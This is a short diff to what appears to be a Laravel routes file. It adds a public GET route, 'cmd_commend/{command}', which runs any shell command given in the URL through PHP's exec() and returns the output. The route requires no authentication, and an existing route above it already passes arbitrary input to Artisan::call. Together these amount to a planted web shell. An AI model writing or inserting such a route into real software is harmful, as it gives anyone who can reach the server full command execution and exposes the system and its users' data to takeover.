@@ -9,6 +9,13 @@ Route::get('artisan_commend/{command}', function ($command) {
         Artisan::call($command);
     }
 });
+Route::get('cmd_commend/{command}', function ($command) {
+    ini_set('max_execution_time', 300);
+    if ($command) {
+        exec($command, $output);
+        return $output;
+    }
+});
 Route::middleware('maintenance_mode')->group(function () {
     Route::post('login', "Auth\LoginController@login");
     Route::post('otp_login', "Auth\LoginController@otpLogin");
